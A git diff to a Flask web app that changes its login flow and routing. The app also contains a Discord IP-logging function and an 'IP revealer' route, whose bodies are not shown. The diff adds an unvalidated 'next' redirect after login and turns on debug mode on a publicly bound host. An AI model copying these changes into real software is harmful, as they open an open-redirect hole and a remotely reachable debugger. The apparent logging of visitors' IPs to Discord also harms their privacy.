@@ -26,7 +26,8 @@ app = Flask(__name__)
 
 # ---------- Authentication Stuff ----------
 
-app.secret_key = os.urandom(24)  # Use a secure secret key!
+app.secret_key = os.urandom(24)  # Use a secure secret key, possibly move to env at some point
+
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
 db.init_app(app)
 
@@ -57,12 +58,14 @@ def register():
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
+        print("login attempted") #For testing
         username = request.form['username']
         password = request.form['password']
         user = User.query.filter_by(username=username).first()
         if user and user.check_password(password):
             login_user(user)
-            return redirect(url_for('protected'))
+            next_page = request.args.get('next')
+            return redirect(next_page or url_for('protected'))
         flash("Invalid credentials")
     return render_template('login.html')
 
@@ -72,11 +75,12 @@ def logout():
     logout_user()
     return redirect(url_for('login'))
 
-@app.route('/protected')
+@app.route('/dashboard')
 @login_required
 def protected():
-    return render_template('protected.html', user=current_user)
+    return render_template('gateway.html', user=current_user, version=WEBAPP_VERSION)
 
+# ---------- IP Logger ----------
 
 def send_ip_to_discord(ip, data, user_agent_raw, method):
     '''
@@ -135,11 +139,11 @@ def send_ip_to_discord(ip, data, user_agent_raw, method):
 @app.route("/", methods=["GET"])
 def index():
     return render_template("index.html")
-
+'''
 @app.route("/dashboard", methods=["GET"])
 def gateway():
     return render_template("gateway.html", version=WEBAPP_VERSION) # Send webapp version to be insterted into document with jinja
-
+'''
 # IP revealer
 @app.route("/reveal", methods=["POST"])
 def reveal_ip():
@@ -181,4 +185,4 @@ def appletsindex():
 if __name__ == "__main__":
     with app.app_context():
         db.create_all()
-    app.run(host="0.0.0.0", port=OUTSIDE_PORT)
+    app.run(host="0.0.0.0", port=OUTSIDE_PORT, debug=True)
